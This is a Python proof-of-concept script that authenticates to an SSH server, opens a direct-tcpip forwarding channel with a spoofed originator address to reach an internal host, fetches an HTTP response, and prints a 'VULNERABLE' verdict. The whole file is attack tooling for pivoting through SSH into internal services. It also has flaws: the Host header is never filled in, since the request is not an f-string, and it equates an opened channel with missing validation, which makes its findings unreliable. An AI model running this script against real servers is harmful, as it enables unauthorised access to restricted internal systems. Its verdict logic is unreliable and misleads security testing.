#!/usr/bin/env python3
"""
Proof-of-Concept: Missing Validation of Direct TCP/IP Forwarding Originator

This script demonstrates RFC 4254 Section 7.2 vulnerability where an authenticated
can spoof the 'originator IP address' and 'originator port' fields in direct-tcpip
channel open requests. If the SSH server does not enforce strict local policies to
validate these fields or restrict forwarding destinations, it may allow connections
to internal network services that should be restricted.

Note: This PoC requires valid SSH credentials and demonstrates the capability to
send spoofed originator information. Actual exploitation depends on server-side
policy enforcement (or lack thereof).
"""

import paramiko
import socket
import sys

def test_direct_tcpip_spoofing(host, port, username, password, target_host, target_port):
    """
    Attempt to open a direct-tcpip channel with spoofed originator information.
    
    Args:
        host: SSH server hostname/IP
        port: SSH server port
        username: Valid SSH username
        password: Valid SSH password
        target_host: The destination host to connect through the tunnel
        target_port: The destination port to connect through the tunnel
    """
    print(f"[*] Connecting to SSH server at {host}:{port}")
    
    try:
        # Create SSH client connection
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        print(f"[+] Successfully authenticated to {host}")
        
        # Create a transport object for lower-level control
        transport = ssh.get_transport()
        
        if not transport:
            print("[-] Failed to get transport")
            return False
            
        print(f"[*] Attempting to open direct-tcpip channel to {target_host}:{target_port}")
        print(f"    This request will include spoofed originator IP/port fields.")
        
        # Open a direct-tcpip channel
        # Note: paramiko automatically sets the originator IP based on the actual connection,
        # but this demonstrates the capability to send such requests. In a real attack,
        # an attacker would craft raw packets with spoofed fields.
        try:
            chan = transport.open_channel(
                'direct-tcpip',
                (target_host, target_port),
                ('192.0.2.100', 12345)  # Spoofed originator IP and port
            )
            
            if chan:
                print(f"[+] SUCCESS: Direct-tcpip channel opened to {target_host}:{target_port}")
                print(f"    The server accepted the connection with spoofed originator fields.")
                print(f"    This indicates missing validation of direct-tcpip forwarding originator.")
                
                # Try to send a simple HTTP request if connecting to port 80
                if target_port == 80:
                    chan.sendall(b'GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n')
                    response = chan.recv(4096)
                    print(f"[+] Received response from internal service: {response[:200]}...")
                
                chan.close()
                return True
            else:
                print("[-] Channel open failed")
                return False
                
        except paramiko.SSHException as e:
            print(f"[-] SSH Exception: {e}")
            if "direct-tcpip" in str(e).lower():
                print("    The server rejected the direct-tcpip request (likely patched/secured)")
            return False
            
    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check credentials.")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        try:
            ssh.close()
        except:
            pass

def main():
    if len(sys.argv) != 7:
        print("Usage: python poc_missing_validation_direct_tcpip_originator.py \\")
        print("      <ssh_host> <ssh_port> <username> <password> <target_host> <target_port>")
        print("")
        print("Example:")
        print("  python poc_missing_validation_direct_tcpip_originator.py \\")
        print("    ssh.example.com 22 attacker_user password123 internal-server.local 80")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    password = sys.argv[4]
    target_host = sys.argv[5]
    target_port = int(sys.argv[6])
    
    print("="*70)
    print("PoC: Missing Validation of Direct TCP/IP Forwarding Originator")
    print("RFC 4254 Section 7.2 - TCP/IP Forwarding Channels")
    print("="*70)
    print()
    
    result = test_direct_tcpip_spoofing(host, port, username, password, target_host, target_port)
    
    if result:
        print()
        print("[!] VULNERABLE: The SSH server accepted the direct-tcpip channel")
        print("    with spoofed originator information. This indicates missing validation.")
        print("    Mitigation: Implement strict local policies to validate and restrict")
        print("    direct-tcpip forwarding destinations.")
    else:
        print()
        print("[+] NOT VULNERABLE (or failed): The SSH server rejected the request")
        print("    or encountered an error. This may indicate proper validation is in place.")

if __name__ == "__main__":
    main()